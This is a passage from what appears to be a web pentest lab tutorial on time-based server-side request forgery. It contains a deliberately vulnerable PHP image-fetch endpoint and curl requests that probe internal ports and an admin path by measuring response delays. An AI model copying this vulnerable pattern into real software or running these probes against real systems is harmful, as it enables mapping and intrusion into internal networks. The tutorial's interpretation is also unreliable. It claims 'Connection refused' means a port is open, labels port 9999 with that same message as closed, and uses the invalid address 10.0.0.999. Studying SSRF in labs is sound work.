...
| :--- | :--- | :--- | :--- |
| **80** | HTTP | Success (streams) | ✅ OPEN |
| **22** | SSH | "Connection refused" | ✅ OPEN |
| **3306** | MySQL | "Connection refused" | ✅ OPEN |
| **9999** | None | "Connection refused" | ❌ CLOSED |
| **10.0.0.5:80** | Firewall | "Timed out" | 🔒 BLOCKED |
...
## Time Based SSRF
      ...
      <?php
      // TIME-BASED SSRF: Response delays expose internal service existence
      if (isset($_GET['img_url'])){
      
          $url = $_GET['img_url']; // Direct user input -> SSRF risk
      
          // # VULNERABLE: fopen() with default 30s timeout if allow_url_fopen=On
          $start_time = microtime(true);
          $file = fopen($url, 'rb', false, stream_context_create([
              'http' => ['timeout' => 5] // 5s timeout for timing attacks
          ]));
          $end_time = microtime(true);
          $duration = round(($end_time - $start_time) * 1000, 0); // ms
      
          if ($file) {
              // # FAST SUCCESS (~50ms) = OPEN HTTP service
              header("Content-Type: image/png");
              fpassthru($file);
              fclose($file);
          } else {
              // # SLOW FAILURES reveal service states:
              // 5000ms = TIMEOUT (firewall/host unreachable)
              // 100-500ms = CONNECTION REFUSED (port open, no HTTP)
              // <50ms = INSTANT FAIL (DNS/parsing error)
              header("Content-Type: text/html");
              echo "<h1>Image not found ({$duration}ms)</h1>";
          }
...
# Time-Based SSRF Detection Technique

**Principle:** Network stack timing reveals port/service status.

- **Port 80 (HTTP) -> 50ms -> Streams content -> OPEN HTTP**

      GET /time-based-ssrf.php?img_url=http://127.0.0.1:80
      Response: Image + "50ms"


- **Port 22 (SSH open) -> 250ms "Connection refused" -> Service exists**

      GET /time-based-ssrf.php?img_url=http://127.0.0.1:22
      Response: "Image not found (250ms)"



- **Port 9999 (closed) -> <120ms "Connection refused" -> No listener**

      GET /time-based-ssrf.php?img_url=http://127.0.0.1:9999
      Response: "Image not found (120ms)"



- **Firewall drop -> 5000ms TIMEOUT -> Host firewalled**

      GET /time-based-ssrf.php?img_url=http://10.0.0.999:80
      Response: "Image not found (5000ms)"

### Timing Patterns by Service State

| Target          | Response Time | Interpretation   | Status   |
| :-------------- | :------------ | :--------------- | :------- |
| 127.0.0.1:80    | 20-100ms      | HTTP success     | HTTP     |
| 127.0.0.1:22    | 100-500ms     | Conn refused     | SSH      |
| 127.0.0.1:3306  | 150-400ms     | Conn refused     | MySQL    |
| 127.0.0.1:9999  | <100ms        | Instant fail     | CLOSED   |
| 10.0.0.999:80   | 5000ms        | Timeout          | FW DROP  |

---

# Real-World Timing Attack Workflow

- **Baseline localhost:80 (known HTTP = FAST)**

      curl -w "HTTP: %{time_total}s\n" "http://192.168.1.31/web-pentest/time-based-ssrf.php?img_url=http://127.0.0.1:80"

`HTTP: 0.045s`

### Test common services

- SSH: 0.234s -> OPEN (refused HTTP but port listening)

  
        curl -w "SSH: %{time_total}s\n" "http://192.168.1.31/web-pentest/time-based-ssrf.php?img_url=http://127.0.0.1:22"
  

- **DB: 0.387s -> OPEN MySQL**

  ```
  curl -w "DB: %{time_total}s\n" "http://192.168.1.31/web-pentest/time-based-ssrf.php?img_url=http://127.0.0.1:3306"
  ```

- **Admin: 0.067s -> HTTP SERVICE!**

  ```
  curl -w "Admin: %{time_total}s\n" "http://192.168.1.31/web-pentest/time-based-ssrf.php?img_url=http://127.0.0.1:8080/admin"
  ```

> Attacker maps entire internal network by timing signatures
